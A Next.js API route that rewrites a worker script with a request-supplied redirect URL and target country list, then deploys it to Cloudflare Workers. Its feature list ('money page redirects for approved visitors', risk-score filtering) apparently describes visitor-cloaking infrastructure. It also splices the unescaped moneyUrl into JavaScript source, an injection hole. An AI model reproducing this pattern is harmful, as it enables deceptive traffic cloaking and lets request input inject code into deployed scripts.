import { NextRequest, NextResponse } from 'next/server';
import { readFileSync } from 'fs';
import { join } from 'path';

export async function POST(request: NextRequest) {
  try {
    const { workerName, moneyUrl, targetCountries } = await request.json();
    
    if (!workerName) {
      return NextResponse.json({ error: 'Worker name is required' }, { status: 400 });
    }
    
    // Read the production worker script from file
    const workerScriptPath = join(process.cwd(), 'production-worker.js');
    let productionWorkerScript;
    
    try {
      productionWorkerScript = readFileSync(workerScriptPath, 'utf8');
    } catch (fileError) {
      console.error('Failed to read production-worker.js:', fileError);
      return NextResponse.json({ 
        error: 'Production worker script file not found' 
      }, { status: 500 });
    }
    
    // Replace dynamic values in the script
    productionWorkerScript = productionWorkerScript.replace(
      "const MONEY_URL = 'https://www.xnxx.com'; // Will be replaced dynamically",
      `const MONEY_URL = '${moneyUrl}';`
    );
    
    productionWorkerScript = productionWorkerScript.replace(
      "const TARGET_COUNTRIES = ['Germany', 'Netherlands']; // Will be replaced dynamically",
      `const TARGET_COUNTRIES = ${JSON.stringify(targetCountries)};`
    );
    
    // Deploy to Cloudflare
    const CLOUDFLARE_API_TOKEN = process.env.CLOUDFLARE_API_TOKEN;
    const CLOUDFLARE_ACCOUNT_ID = process.env.CLOUDFLARE_ACCOUNT_ID;
    
    if (!CLOUDFLARE_API_TOKEN || !CLOUDFLARE_ACCOUNT_ID) {
      return NextResponse.json({ 
        error: 'Cloudflare API credentials not configured' 
      }, { status: 500 });
    }
    
    console.log(`Deploying production worker: ${workerName}`);
    
    const response = await fetch(
      `https://api.cloudflare.com/client/v4/accounts/${CLOUDFLARE_ACCOUNT_ID}/workers/scripts/${workerName}`,
      {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/javascript',
          'Authorization': `Bearer ${CLOUDFLARE_API_TOKEN}`,
        },
        body: productionWorkerScript,
      }
    );
    
    const result = await response.json();
    
    if (!response.ok) {
      console.error('Failed to deploy production worker:', result);
      return NextResponse.json({ 
        error: 'Failed to deploy production worker',
        details: result.errors || result
      }, { status: 500 });
    }
    
    console.log('Production worker deployed successfully:', result);
    
    return NextResponse.json({
      success: true,
      message: `Production worker ${workerName} deployed successfully`,
      workerName,
      version: 'production-1.0',
      features: [
        'Real JCI API calls',
        'Money page redirects for approved visitors',
        'Country targeting',
        'Risk score filtering',
        'Proper domain logging'
      ]
    });
    
  } catch (error) {
    console.error('Error deploying production worker:', error);
    return NextResponse.json({
      error: error instanceof Error ? error.message : 'Unknown error'
    }, { status: 500 });
  }
} 